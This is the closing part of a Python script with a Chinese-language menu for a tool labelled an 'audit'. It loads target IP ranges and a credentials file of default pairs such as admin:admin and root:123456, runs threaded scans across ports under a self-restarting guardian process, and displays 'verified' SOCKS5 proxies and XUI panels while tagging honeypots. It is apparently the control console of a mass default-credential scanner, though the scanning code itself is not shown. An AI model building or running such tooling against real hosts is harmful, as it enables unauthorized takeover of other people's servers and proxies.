        elif c == "8":
            stopped_any = disable_and_stop_guardian_processes()
            if stopped_any:
                print(f"{C_WARN}>>> 守护进程已停止{C_W}")
            else:
                print(f"{C_DIM}没有运行中的守护{C_W}")
            time.sleep(1)

        elif c == "9":
            break
        elif c == "11":
            try:
                last_sig = None
                while True:
                    st = load_state(STATE_FILE)
                    _, _, s5_audited, s5_verified = collect_report_sections(limit=None)
                    sig = (
                        len(s5_audited),
                        len(s5_verified),
                        s5_audited[-1] if s5_audited else "",
                        s5_verified[-1] if s5_verified else "",
                    )
                    if sig != last_sig:
                        last_sig = sig
                        os.system("cls" if os.name == "nt" else "clear")
                        print(f"\n{C_CYAN}>>> S5 审计实时面板{C_W}")
                        print(
                            f"发现: {C_CYAN}{len(s5_audited)}{C_W} | 验证成功: {C_SUCC}{len(s5_verified)}{C_W}"
                        )
                        print(
                            f"最新IP: 审计 {C_CYAN}{latest_ip_port(s5_audited)}{C_W} | 验真 {C_SUCC}{latest_ip_port(s5_verified)}{C_W}"
                        )
                        print(f"\n{C_CYAN}[S5 发现]{C_W}\n")
                        print(
                            "\n".join(
                                format_result_line(l, "socks5") for l in s5_audited
                            )
                            if s5_audited
                            else f"{C_DIM}暂无S5审计数据{C_W}"
                        )
                        print(f"\n{C_CYAN}[S5 验证成功]{C_W}\n")
                        print(
                            "\n".join(
                                format_result_line(l, "socks5") for l in s5_verified
                            )
                            if s5_verified
                            else f"{C_DIM}暂无S5验真数据{C_W}"
                        )
                        print(f"\n{C_DIM}输入 0 返回主菜单...{C_W}")
                    if poll_zero_to_back(0.5):
                        break
            except KeyboardInterrupt:
                pass

        elif c == "13":
            print(f"\n{C_CYAN}>>> 分类清理审计结果{C_W}")
            print("1) 清理 XUI")
            print("2) 清理 S5")
            print("3) 清理 蜜罐")
            sel = input("请选择 (输入 0 返回): ").strip()
            if sel == "0":
                continue
            if sel not in ("1", "2", "3"):
                print(f"{C_WARN}无效选项{C_W}")
                time.sleep(1)
                continue
            sure = input("确认执行? (y/n): ").strip().lower()
            if sure != "y":
                print(f"{C_DIM}已取消{C_W}")
                time.sleep(1)
                continue
            category = {"1": "xui", "2": "s5", "3": "honeypot"}[sel]
            removed = clear_report_by_category(category)
            print(f"{C_SUCC}>>> 清理完成，移除 {removed} 条{C_W}")
            time.sleep(1.2)

        elif c == "14":
            rows = collect_suspected_no_l7(limit=None)
            os.system("cls" if os.name == "nt" else "clear")
            print(f"\n{C_CYAN}>>> 疑似无L7能力列表{C_W}")
            print(f"总数: {C_CYAN}{len(rows)}{C_W}\n")
            if rows:
                print("\n".join(format_result_line(x, "socks5") for x in rows))
            else:
                print(f"{C_DIM}暂无疑似无L7数据{C_W}")
            wait_for_zero_return(f"\n{C_BLUE}输入 0 返回...{C_W}")

        elif c == "15":
            print(f"\n{C_WARN}>>> 一键清理将停止审计/守护并删除运行文件{C_W}")
            print(
                f"{C_DIM}仅保留 IP 文件与 tokens 文件（如 nodes.list/ip.txt/pass.txt）{C_W}"
            )
            sure = input("确认执行? (y/n): ").strip().lower()
            if sure == "0":
                continue
            if sure == "y":
                stopped, removed = one_key_cleanup()
                print(
                    f"{C_SUCC}>>> 清理完成: 停止进程 {stopped} 个, 删除文件 {removed} 个{C_W}"
                )
            else:
                print(f"{C_DIM}已取消{C_W}")
            time.sleep(1.2)

        elif c == "16":
            print(f"\n{C_CYAN}>>> 更换 IP 列表 ({NODE_FILE}){C_W}")
            print(f"{C_DIM}支持空格/换行混合输入，保存后自动按一行一个目标整理{C_W}")
            print(f"{C_DIM}示例: 1.1.1.1 2.2.2.2/24 3.3.3.3-3.3.3.9{C_W}")
            count = write_list_file_from_input(NODE_FILE, split_spaces=True)
            if count is None:
                print(f"{C_WARN}>>> 写入失败或已取消{C_W}")
            else:
                print(f"{C_SUCC}>>> IP 列表已更新，共 {count} 条{C_W}")
                reload_now = input("是否立即重载当前审计任务? (y/n): ").strip().lower()
                if reload_now == "y":
                    ok, detail = reload_running_audit()
                    if ok:
                        print(f"{C_SUCC}>>> {detail}{C_W}")
                    else:
                        print(f"{C_WARN}>>> 重载失败: {detail}{C_W}")
            time.sleep(1.2)

        elif c == "17":
            print(f"\n{C_CYAN}>>> 更新 Tokens ({TOKEN_FILE}){C_W}")
            print(
                f"{C_DIM}支持空格/换行混合输入，格式示例: admin:admin  root:123456{C_W}"
            )
            count = write_list_file_from_input(TOKEN_FILE, split_spaces=True)
            if count is None:
                print(f"{C_WARN}>>> 写入失败或已取消{C_W}")
            else:
                print(f"{C_SUCC}>>> Tokens 已更新，共 {count} 条{C_W}")
                reload_now = input("是否立即重载当前审计任务? (y/n): ").strip().lower()
                if reload_now == "y":
                    ok, detail = reload_running_audit()
                    if ok:
                        print(f"{C_SUCC}>>> {detail}{C_W}")
                    else:
                        print(f"{C_WARN}>>> 重载失败: {detail}{C_W}")
            time.sleep(1.2)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "run":
        # ... (参数解析逻辑保持一致)
        if len(sys.argv) < 7:
            raise SystemExit("参数不足")
        got_lock, holder_pid = acquire_run_lock()
        if not got_lock:
            if holder_pid > 0:
                raise SystemExit(f"已有审计进程运行中 (PID {holder_pid})")
            raise SystemExit("已有审计进程运行中")
        mode, work_mode, threads = int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
        ports, feed_int = parse_ports(sys.argv[5]), float(sys.argv[6])
        if (
            mode not in (1, 2, 3)
            or work_mode not in (1, 2, 3)
            or threads < 1
            or not ports
            or feed_int < 0
        ):
            raise SystemExit("Err")
        try:
            asyncio.run(
                internal_audit_process(mode, work_mode, threads, ports, feed_int)
            )
        except Exception:
            log_exception("fatal crash in run mode")
            raise
        finally:
            release_run_lock()
    elif len(sys.argv) > 1 and sys.argv[1] == "guardian":
        # ... (参数解析逻辑保持一致)
        if len(sys.argv) < 6:
            raise SystemExit("参数不足")
        got_g_lock, g_holder_pid = acquire_guardian_lock()
        if not got_g_lock:
            if g_holder_pid > 0:
                raise SystemExit(f"已有守护进程运行中 (PID {g_holder_pid})")
            raise SystemExit("已有守护进程运行中")
        try:
            set_guardian_enabled(True)
            mode, work_mode, threads, ports_str = (
                int(sys.argv[2]),
                int(sys.argv[3]),
                int(sys.argv[4]),
                sys.argv[5],
            )
            feed_int = float(sys.argv[6]) if len(sys.argv) > 6 else 0.05
            check_interval = float(sys.argv[7]) if len(sys.argv) > 7 else 20.0
            min_free_mb = float(sys.argv[8]) if len(sys.argv) > 8 else 256.0
            run_guardian(
                mode,
                work_mode,
                threads,
                ports_str,
                feed_int,
                check_interval,
                min_free_mb,
            )
        except ValueError:
            raise SystemExit("Err")
        except Exception:
            log_exception("fatal crash in guardian mode")
            raise
        finally:
            release_guardian_lock()
    else:
        main_console()
